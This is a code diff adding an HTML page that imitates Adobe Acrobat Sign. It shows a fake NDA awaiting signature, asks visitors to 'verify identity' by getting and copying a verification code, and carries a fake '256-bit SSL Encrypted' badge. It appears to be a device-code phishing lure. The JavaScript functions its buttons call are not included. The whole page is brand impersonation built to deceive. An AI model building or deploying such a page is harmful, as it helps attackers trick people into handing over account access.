@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adobe Acrobat Sign · Document Review</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+        :root {
+            --ab-red: #EB1C24; --ab-red-dark: #C51219; --ab-red-light: #FDF3F3;
+            --ab-dark: #2C2C2C; --ab-gray-bg: #F4F5F7; --ab-gray-border: #E1E2E6;
+            --ab-gray-text: #686868; --ab-white: #FFFFFF; --ab-green: #2D9D3A;
+            --radius-lg: 12px; --radius-md: 8px; --shadow-card: 0 4px 20px rgba(0,0,0,.06);
+        }
+        body { font-family: 'Segoe UI', -apple-system, sans-serif; background: var(--ab-gray-bg); min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: flex-start; padding: 24px 16px; }
+        
+        /* Adobe Sign Header Bar */
+        .sign-header-bar { width: 100%; max-width: 720px; background: var(--ab-white); border: 1px solid var(--ab-gray-border); border-radius: var(--radius-lg); display: flex; align-items: center; justify-content: space-between; padding: 16px 28px; margin-bottom: 20px; box-shadow: var(--shadow-card); }
+        .brand-group { display: flex; align-items: center; gap: 14px; }
+        .adobe-box { width: 36px; height: 36px; background: var(--ab-red); border-radius: 4px; display: flex; align-items: center; justify-content: center; color: #fff; font-weight: 700; font-size: 20px; }
+        .brand-text { font-size: 16px; font-weight: 700; color: #111; letter-spacing: -.2px; }
+        .brand-text span { color: var(--ab-red); font-weight: 400; font-size: 14px; display: block; }
+        .portal-title { font-size: 14px; font-weight: 600; color: var(--ab-dark); }
+        .need-help { font-size: 13px; color: #0284c7; text-decoration: none; font-weight: 500; }
+        .need-help:hover { text-decoration: underline; }
+
+        /* Main Card Container - Controlled width before state change */
+        .card { background: var(--ab-white); border-radius: var(--radius-lg); box-shadow: var(--shadow-card); border: 1px solid var(--ab-gray-border); width: 100%; max-width: 720px; overflow: hidden; transition: max-width 0.3s ease; }
+        .card.expanded { max-width: 900px; }
+        
+        /* Red Banner */
+        .card-header { background: var(--ab-red); padding: 28px 32px; color: #fff; display: flex; align-items: center; justify-content: flex-start; gap: 20px; text-align: left; }
+        
+        .banner-doc-icon { width: 44px; height: 56px; background: #FFFFFF; border-radius: 3px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); display: flex; flex-direction: column; align-items: center; justify-content: flex-start; padding: 8px 6px; position: relative; flex-shrink: 0; }
+        .banner-doc-fold { position: absolute; top: 0; right: 0; width: 12px; height: 12px; background: linear-gradient(135deg, transparent 50%, #cbd5e1 50%); border-bottom-left-radius: 2px; }
+        .banner-doc-lines { width: 100%; display: flex; flex-direction: column; gap: 4px; margin-top: 8px; }
+        .banner-doc-line { height: 2.5px; background: #d1d5db; border-radius: 1px; width: 100%; }
+        .banner-doc-line:nth-child(2) { width: 75%; }
+        .banner-doc-line:nth-child(3) { width: 50%; }
+        
+        .card-header-text h1 { font-size: 18px; font-weight: 700; margin-bottom: 2px; letter-spacing: -.2px; }
+        .card-header-text p { font-size: 13px; opacity: .95; font-weight: 400; }
+
+        /* Steps Bar with connecting horizontal lines matching screenshot */
+        .steps-bar { display: flex; align-items: center; justify-content: center; gap: 24px; padding: 20px 32px; border-bottom: 1px solid var(--ab-gray-border); background: #fafafa; }
+        .step-item { display: flex; align-items: center; gap: 8px; font-size: 13px; font-weight: 500; color: #9ca3af; position: relative; }
+        .step-num { width: 24px; height: 24px; border-radius: 50%; background: #e5e7eb; color: #4b5563; font-size: 12px; font-weight: 700; display: flex; align-items: center; justify-content: center; z-index: 2; }
+        .step-item.active { color: #111; font-weight: 600; }
+        .step-item.active .step-num { background: var(--ab-red); color: #fff; }
+        .step-item.done .step-num { background: var(--ab-green); color: #fff; }
+
+        /* Connecting lines between steps */
+        .step-item:not(:last-child):after {
+            content: '';
+            position: absolute;
+            left: calc(100% + 8px);
+            width: 40px;
+            height: 2px;
+            background: #e5e7eb;
+            top: 50%;
+            transform: translateY(-50%);
+            z-index: 1;
+        }
+
+        /* Doc Info Row */
+        .doc-info { display: flex; align-items: center; justify-content: space-between; padding: 20px 32px; border-bottom: 1px solid var(--ab-gray-border); }
+        .doc-left { display: flex; align-items: center; gap: 14px; }
+        .doc-icon-box { width: 40px; height: 48px; background: #fee2e2; border: 1px solid #fca5a5; border-radius: 4px; display: flex; align-items: center; justify-content: center; color: var(--ab-red); font-weight: 700; font-size: 11px; }
+        .doc-details h4 { font-size: 14px; font-weight: 600; color: #111; margin-bottom: 2px; }
+        .doc-details p { font-size: 12px; color: var(--ab-gray-text); }
+        .pending-badge { background: #e0f2fe; color: #0369a1; border: 1px solid #bae6fd; font-size: 10px; font-weight: 700; padding: 4px 10px; border-radius: 4px; text-transform: uppercase; letter-spacing: .5px; }
+
+        /* Card Body */
+        .card-body { padding: 40px 32px; text-align: center; }
+
+        /* Initial Start Button */
+        .btn-primary { background: var(--ab-red); color: #fff; border: none; border-radius: var(--radius-md); padding: 14px 28px; font-size: 14px; font-weight: 600; cursor: pointer; display: inline-flex; align-items: center; justify-content: center; gap: 8px; transition: background .15s; width: 100%; max-width: 320px; margin: 0 auto; }
+        .btn-primary:hover { background: var(--ab-red-dark); }
+        .btn-primary:disabled { background: #d1d5db; cursor: not-allowed; }
+
+        /* Code Panel & Loading State */
+        .code-panel { display: none; margin-top: 10px; text-align: left; max-width: 480px; margin-left: auto; margin-right: auto; }
+        .code-panel.show { display: block; }
+        
+        .code-box { background: #f8fafc; border: 1.5px solid var(--ab-gray-border); border-radius: var(--radius-md); padding: 24px; text-align: center; margin-bottom: 16px; }
+        .code-value { font-family: monospace; font-size: 38px; font-weight: 700; letter-spacing: 10px; color: #111; user-select: all; }
+        .code-hint { font-size: 12px; color: var(--ab-gray-text); margin-top: 6px; }
+
+        /* Spinner & Progress bar */
+        .spinner-container { text-align: center; padding: 20px 0; }
+        .spinner { width: 44px; height: 44px; border: 3px solid #f3f3f3; border-top: 3px solid var(--ab-red); border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 16px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .loading-title { font-size: 16px; font-weight: 700; color: #111; margin-bottom: 4px; }
+        .loading-subtitle { font-size: 13px; color: var(--ab-gray-text); margin-bottom: 20px; }
+        
+        .progress-bar-track { width: 100%; max-width: 340px; height: 4px; background: #e5e7eb; border-radius: 2px; margin: 0 auto; overflow: hidden; }
+        .progress-bar-fill { width: 40%; height: 100%; background: var(--ab-red); border-radius: 2px; animation: progressAnim 1.5s ease infinite alternate; }
+        @keyframes progressAnim { 0% { transform: translateX(-50%); } 100% { transform: translateX(150%); } }
+
+        /* Timer and Actions */
+        .timer-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; }
+        .timer-pill { background: var(--ab-red-light); color: var(--ab-red); font-size: 12px; font-weight: 600; padding: 4px 12px; border-radius: 20px; }
+        .timer-pill.expired { background: #fee2e2; color: #dc2626; }
+        .refresh-btn { background: none; border: none; color: var(--ab-red); font-size: 13px; font-weight: 600; cursor: pointer; display: inline-flex; align-items: center; gap: 4px; }
+        .refresh-btn:hover { text-decoration: underline; }
+
+        .action-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 16px; }
+        .btn-secondary { background: transparent; border: 1.5px solid var(--ab-gray-border); color: #374151; padding: 12px; border-radius: var(--radius-md); font-size: 13px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 6px; }
+        .btn-secondary:hover { border-color: var(--ab-red); color: var(--ab-red); background: var(--ab-red-light); }
+
+        .status-text { font-size: 12px; text-align: center; margin-top: 12px; min-height: 18px; color: var(--ab-gray-text); }
+        .status-text.error { color: #dc2626; background: #fee2e2; padding: 6px; border-radius: 4px; }
+
+        /* Footer info */
+        .card-footer-info { display: flex; align-items: center; justify-content: space-between; padding: 16px 32px; border-top: 1px solid var(--ab-gray-border); }
+        
+        .ssl { display: flex; align-items: center; gap: 10px; color: #7b7b7b; font-size: 13px; font-weight: 400; }
+        .ssl-icon { width: 18px; height: 18px; flex-shrink: 0; }
+
+        .footer-links { display: flex; gap: 16px; font-size: 13px; }
+        .footer-links a { color: #0284c7; text-decoration: none; }
+        .footer-links a:hover { text-decoration: underline; }
+
+        /* Success Overlay */
+        .overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,.5); backdrop-filter: blur(2px); align-items: center; justify-content: center; z-index: 100; }
+        .overlay.show { display: flex; }
+        .overlay-card { background: #fff; padding: 40px; border-radius: var(--radius-lg); text-align: center; width: 320px; box-shadow: 0 10px 30px rgba(0,0,0,.2); }
+        .check-icon { width: 50px; height: 50px; background: #dcfce7; color: var(--ab-green); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px; margin: 0 auto 16px; }
+        .overlay-card h3 { font-size: 18px; font-weight: 700; color: #111; margin-bottom: 6px; }
+        .overlay-card p { font-size: 13px; color: var(--ab-gray-text); }
+
+        @media(max-width: 640px) {
+            body { padding: 10px 6px; }
+            .sign-header-bar, .card { max-width: 100%; }
+            .sign-header-bar { padding: 12px 16px; }
+            .portal-title { display: none; }
+            .card-header { padding: 20px 16px; gap: 14px; }
+            .banner-doc-icon { width: 36px; height: 46px; }
+            .card-header-text h1 { font-size: 15px; }
+            .card-header-text p { font-size: 11px; }
+            .steps-bar { padding: 12px 16px; gap: 12px; }
+            .step-item { font-size: 11px; }
+            .step-item:not(:last-child):after { width: 20px; left: calc(100% + 4px); }
+            .doc-info { padding: 14px 16px; }
+            .card-body { padding: 24px 16px; }
+            .card-footer-info { padding: 14px 16px; flex-direction: column; align-items: flex-start; gap: 12px; }
+            .action-row { grid-template-columns: 1fr; }
+            .code-value { font-size: 28px; letter-spacing: 5px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Acrobat Sign Header Bar -->
+    <div class="sign-header-bar" id="headerBar">
+        <div class="brand-group">
+            <div class="adobe-box">A</div>
+            <div class="brand-text">Adobe <span>Acrobat Sign</span></div>
+        </div>
+        <div class="portal-title">Document Review</div>
+        <a href="#" class="need-help">Need help?</a>
+    </div>
+
+    <!-- Main Card Container -->
+    <div class="card" id="mainCard">
+        <div class="card-header">
+            <div class="banner-doc-icon">
+                <div class="banner-doc-fold"></div>
+                <div class="banner-doc-lines">
+                    <div class="banner-doc-line"></div>
+                    <div class="banner-doc-line"></div>
+                    <div class="banner-doc-line"></div>
+                </div>
+            </div>
+            <div class="card-header-text">
+                <h1>Document Ready for Review</h1>
+                <p>Verify your identity to access and sign</p>
+            </div>
+        </div>
+
+        <div class="steps-bar" id="stepsRow">
+            <div class="step-item active" id="step1"><div class="step-num" id="stepNum1">1</div> Verify Identity</div>
+            <div class="step-item" id="step2"><div class="step-num" id="stepNum2">2</div> Review</div>
+            <div class="step-item" id="step3"><div class="step-num" id="stepNum3">3</div> Sign</div>
+        </div>
+
+        <div class="doc-info">
+            <div class="doc-left">
+                <div class="doc-icon-box">PDF</div>
+                <div class="doc-details">
+                    <h4>Non-Disclosure Agreement</h4>
+                    <p><span>NDA-2026-Final.pdf</span> · <span>4 pages</span></p>
+                </div>
+            </div>
+            <div class="pending-badge">Pending signature</div>
+        </div>
+
+        <div class="card-body">
+            <button class="btn-primary" id="startBtn" onclick="generateCode()">
+                Get verification code
+            </button>
+
+            <div class="code-panel" id="codePanel">
+                <!-- Initial Loading state -->
+                <div id="loadingView" class="spinner-container">
+                    <div class="spinner"></div>
+                    <div class="loading-title">Securing your session...</div>
+                    <div class="loading-subtitle">Initializing secure connection...</div>
+                    <div class="progress-bar-track">
+                        <div class="progress-bar-fill"></div>
+                    </div>
+                </div>
+
+                <!-- Code View -->
+                <div id="codeLoadedView" style="display: none;">
+                    <div class="code-box">
+                        <div class="code-value" id="codeValue">· · · · · ·</div>
+                        <div class="code-hint">Use this code to complete verification on your device.</div>
+                    </div>
+                    <div class="timer-row">
+                        <div class="timer-pill" id="timerPill" style="display:none"></div>
+                        <button class="refresh-btn" id="refreshBtn" onclick="refreshCode()" style="display:none">
+                            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M23 4v6h-6M1 20v-6h6"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg> Get new code
+                        </button>
+                    </div>
+                    <div class="action-row" id="actionRow" style="display:none">
+                        <button class="btn-secondary" id="copyBtn" onclick="copyAndOpenPopup()">
+                            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy code
+                        </button>
+                        <button class="btn-primary" id="verifyBtn" onclick="verifyWithCopy()" style="margin:0; width:100%;">
+                            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg> Sign document
+                        </button>
+                    </div>
+                </div>
+
+                <div class="status-text" id="statusMsg"></div>
+            </div>
+        </div>
+
+        <div class="card-footer-info">
+            <div class="ssl">
+                <svg class="ssl-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path fill="#17A65A" d="M12 2L4.5 5v6.5c0 5.1 3.2 9.7 7.5 11.5 4.3-1.8 7.5-6.4 7.5-11.5V5L12 2z"/>
+                    <path fill="#ffffff" d="M10.6 14.9l-2.4-2.4 1.1-1.1 1.3 1.3 4-4 1.1 1.1-5.1 5.1z"/>
+                </svg>
+                <span>256-bit SSL Encrypted</span>
+            </div>
+            <div class="footer-links">
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms of Use</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Overlay -->
+    <div class="overlay" id="overlay">
+        <div class="overlay-card">
+            <div class="check-icon">✓</div>
+            <h3>Access granted</h3>
+            <p id="overlayMsg">Identity verified.<br>Redirecting to your document…</p>
+        </div>
+    </div>
+</body>
+</html>
